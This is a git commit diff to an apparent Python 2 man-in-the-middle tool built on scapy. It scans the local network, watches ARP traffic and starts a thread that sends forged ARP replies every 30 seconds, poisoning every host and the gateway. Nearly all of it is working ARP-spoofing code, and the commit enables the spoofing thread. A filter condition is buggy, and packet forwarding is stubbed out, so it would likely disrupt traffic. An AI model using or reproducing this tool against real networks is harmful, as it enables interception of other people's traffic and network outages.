c62840ecf6f40abf2d4fd2c18da1b749b66d8ce8
guykoy123 <guykoy123@gmail.com>
2017-11-15 18:34:12 +0200

    finished setup function, working on handling sniffed packet

--- MITM.py
+++ MITM.py
@@ -7,7 +7,7 @@ from time import sleep
 from scapy.all import *
 from datetime import datetime
 import functions
-
+import Queue
 
 # except ImportError:
 #
@@ -15,40 +15,36 @@ import functions
 #     print 'a module is missing please check you have all required modules'
 
 # global variables:
-stop=False
-localHost=''
 localAddresses=[]
 addressesLock=Lock()
 
-def add_packet(pkt):
+
+def handle_Packet(pkt):
     """
-    adds sniffed packets to list of prescanned packets
-    and sends it forward
+    add sniffed packets to queue of prescanned packets
+    send it forward
     """
     if ARP not in pkt:
         pass
-        #TODO:add to queue
+        #TODO: decide if to do live scanning or adding to queue and then scanning
+    pass
+    #functions.sendPacket(pkt,localAddresses[0])
 
-    functions.sendPacket(pkt,localAddresses[0])
 
 
-
-def get_MAC_Address(pkt):
+def get_IP_Address(pkt):
     """
     adds host address if does not yet exist in listen
     """
     if pkt[ARP].op == 2: # is-at
-        #if pkt[ARP].pdst==localHost[0]:
-        address=(pkt[ARP].psrc,pkt[ARP].hwsrc)
+
+        address=pkt[ARP].psrc #extract IP address
         addressesLock.acquire()
         global localAddresses
-        if address not in localAddresses:
-            localAddresses.append(address)
-            print len(localAddresses)
+        if address not in localAddresses: #check for duplicates
+            localAddresses.append(address) #add IP address to list of all hosts
+            print 'added',address
             addressesLock.release()
-            #TODO: log all packets and check them for responses
-
-
 
 
 
@@ -58,43 +54,38 @@ def monitor_network():
     monitors network for any new devices
     """
 
-    sniff(prn=get_MAC_Address,filter=arp)
+    sniff(prn=get_IP_Address,filter='arp')
 
-def arpSpoof(router,localMAC):
+
+
+def arpSpoof(router,localHost):
     """
     every 30 seconds send ARP broadcast to spoof all machines on LAN
     """
 
     while True:
         if len(localAddresses)>0:
-            #TODO: change from handling dictionary to list
             addressesLock.acquire()
+            print 'spoofing'
             for host in localAddresses:
-                if host[0] != defaultGateway:
+                if host != router and host != localHost: #check that ip does not match default gateway or local host to not send packets to them
 
-                    #create arp packets
-                    victimPacket = Ether(src=localMAC,dst=host[1])/ARP(op=2, hwsrc=localMAC,psrc = router[0], pdst=host[0], hwdst = host[1])
-                    #victimPacket.show()
-                    gatewayPacket=Ether(dst=router[1],src=localMAC)/ARP(op=2,hwsrc=localMAC,psrc=host[0],hwdst=router[1],pdst=router[0])
-                    #gatewayPacket.show()
+                    victimPacket = Ether()/ARP(op=2,psrc = router, pdst=host[0])#create arp packets
+                    gatewayPacket=Ether()/ARP(op=2,psrc=host[0],pdst=router)
 
-                    #send packets
-                    sendp(victimPacket)
+                    sendp(victimPacket)#send packets
                     sendp(gatewayPacket)
+
             addressesLock.release()
             sleep(30)
 
 
 
-def get_Local_Addresses():
+def get_Local_Addresses(defaultGateway,localHost):
     """
     scan network for all active hosts
     """
 
-    # os.system('arp-scan --localnet > arpscanOutput.txt')
-    # with open('arpscanOutput.txt','r') as f:
-    #     output=f.read()
-    # print output
     output =functions.proc_output('arp-scan --localnet')
     temp=output.split('\t')[:-1]
     addrs=[]
@@ -104,7 +95,8 @@ def get_Local_Addresses():
     global localAddresses
     for i in range(0,len(addrs),2):
         host=addrs[i]
-        localAddresses.append(host)
+        if host != defaultGateway or host != localHost: #check if the ip is not the local host's ip or the default gateway
+            localAddresses.append(host)
     print localAddresses
 
 
@@ -113,24 +105,23 @@ def setup():
     get all necessary values for the program to run
     and start all threads
     """
-    global localHost
     #get default gateway and local IP address
-    #functions.getLocalhostAddress()
     defaultGateway,localHost=functions.getLocalhostAddress()
-    logging.debug('got default gateway, local IP, local MAC and Subnet Mask')
+    print defaultGateway,localHost
+    logging.debug('got default gateway and local IP')
 
-    get_Local_Addresses()
+    get_Local_Addresses(defaultGateway,localHost) #get addresses of all hosts on network
     logging.debug('scanned network for all active hosts')
 
     monitorThread=Thread(target=monitor_network)
-    #monitorThread.start()
+    monitorThread.start()
     logging.debug('created thread for monitoring network for new devices')
 
-    #arpThread=Thread(target=arpSpoof,args=(router,localHost[1],))
-    #arpThread.start()
+    arpThread=Thread(target=arpSpoof,args=(defaultGateway,localHost,))
+    arpThread.start()
     logging.debug('created thread for ARP spoofing')
 
-    #return defaultGateway,subnetMask
+
 
 
 def main():
@@ -142,14 +133,12 @@ def main():
     #setup logging to file logFile.txt
     logging.basicConfig(filename='logFile.txt',level=logging.DEBUG, format='%(lineno)s - %(levelname)s : %(message)s')
     logging.info('\n\n\n\n\n########## Program Start ##########\n\n')
-    get_Local_Addresses()
 
-    if not stop:
-        #defaultGateway,subnetMask=setup() # get all necessary values before beginning
-        pass
+    setup() #get all required variables and start all threads
+    logging.info('setup complete')
 
-    # while not stop: #main loop
-    #     sniff(prn=add_packet,count=5) #listen for packets
+
+    sniff(prn=handle_Packet)
 
     while True:
         pass
--- functions.py
+++ functions.py
@@ -23,6 +23,7 @@ def getLocalhostAddress():
     returns default gateway address,
     Subnet Mask
     and localhost IP address"""
+    
     defaultGateway=proc_output('ip route | awk \'/default/ { print $3 }\'')
     localHost=proc_output('ip route | awk \'/src/ { print $9 }\'')
     return defaultGateway,localHost
@@ -31,28 +32,8 @@ def sendPacket(packet,defaultGateway):
     """
     sends packet to intended destination
     """
-    #TODO: test function
-    if IP in packet:
-        packet[IP].pdst=defaultGateway[0]
-        packet[Ether].hwdst=defaultGateway[1] # set destination address to routers address
-        sendp(packet) # send the packet
-
-    elif ARP in packet:
-        if packet[ARP].pdst==defaultGateway[0]:
-            srcIP=packet[ARP].psrc
-            srcMAC=packet[ARP].hwsrc # save source address
-
-            packet[ARP].psrc=defaultGateway[0]
-            packet[ARP].hwsrc=localHost[1] # set source address to router IP and localhost MAC
-
-            packet[ARP].op=2 # set operation code to 2 (is-at)
-
-            packet[ARP].pdst=srcIP # set destination address to source address
-            packet[ARP].hwdst=srcMAC
-
-            sendp(packet) # send packet
-    else:
-        print packet.show()
+    #TODO: rewrite
+    pass
 
 
 
